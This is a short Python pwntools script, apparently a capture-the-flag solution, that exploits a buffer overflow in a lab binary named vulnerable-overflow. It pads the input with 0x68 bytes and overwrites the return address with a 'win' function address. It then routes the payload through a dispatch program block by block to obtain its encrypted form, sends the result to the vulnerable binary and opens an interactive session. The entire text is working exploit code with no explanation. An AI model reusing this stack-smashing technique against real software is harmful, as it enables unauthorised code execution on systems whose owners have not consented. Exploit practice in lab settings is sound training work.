from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import struct
import sys
from pwn import *
import math

full_decryption = b""
payload = b"A" * 0x68
win = p64(0x4013b6)
a = 0
payload += win # 8 blocks


blocks = math.ceil(len(payload)/16)
for i in range((blocks)):
    p = process("/challenge/dispatch")
    send_payload = payload[a:16+a]
    p.send(send_payload)
    decryption = p.read()
    if i == 0:
        full_decryption += decryption[:32]
        a += 16
    else:
        full_decryption += decryption[16:32]
        a += 16
print(full_decryption)
#output = p.read()
#print(output)
p2 = process("/challenge/vulnerable-overflow")
p2.send(full_decryption)
p2.interactive()
